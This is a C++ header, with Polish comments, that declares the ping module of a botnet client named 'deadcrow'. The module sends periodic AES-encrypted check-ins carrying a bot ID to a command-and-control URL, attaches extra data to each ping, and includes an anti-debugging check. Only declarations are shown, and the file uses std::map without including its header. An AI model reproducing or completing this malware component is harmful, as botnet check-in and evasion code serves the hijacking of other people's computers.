#pragma once

#include <string>
#include <vector>
#include <functional>
#include <chrono>
#include <thread>
#include <atomic>
#include <memory>

namespace deadcrow {
namespace botnet {

class Ping {
public:
    // Konstruktor
    Ping(const std::string& c2_url, const std::string& aes_key, const std::string& bot_id);
    
    // Destruktor
    ~Ping();
    
    // Rozpoczęcie pingowania
    bool start(int interval_seconds = 300);
    
    // Zatrzymanie pingowania
    void stop();
    
    // Wykonanie jednorazowego pinga
    bool sendPing();
    
    // Ustawienie callbacka do raportowania statusu
    void setStatusCallback(std::function<void(const std::string&)> callback);
    
    // Sprawdzenie, czy ping jest aktywny
    bool isActive() const;
    
    // Ustawienie dodatkowych danych do wysyłania z pingiem
    void setAdditionalData(const std::string& key, const std::string& value);
    
private:
    // URL serwera C2
    std::string c2_url_;
    
    // Klucz AES do szyfrowania komunikacji
    std::string aes_key_;
    
    // ID bota
    std::string bot_id_;
    
    // Wątek pingowania
    std::unique_ptr<std::thread> ping_thread_;
    
    // Flaga aktywności
    std::atomic<bool> active_;
    
    // Dodatkowe dane do wysyłania z pingiem
    std::map<std::string, std::string> additional_data_;
    
    // Callback do raportowania statusu
    std::function<void(const std::string&)> status_callback_;
    
    // Funkcja wykonywana w wątku pingowania
    void pingLoop(int interval_seconds);
    
    // Wysłanie żądania do C2
    std::string sendRequest(const std::string& endpoint, const std::string& data);
    
    // Parsowanie odpowiedzi z C2
    bool parseResponse(const std::string& response);
    
    // Raportowanie statusu
    void reportStatus(const std::string& status);
    
    // Sprawdzanie, czy nie jesteśmy debugowani
    bool checkForDebugging();
};

} // namespace botnet
} // namespace deadcrow
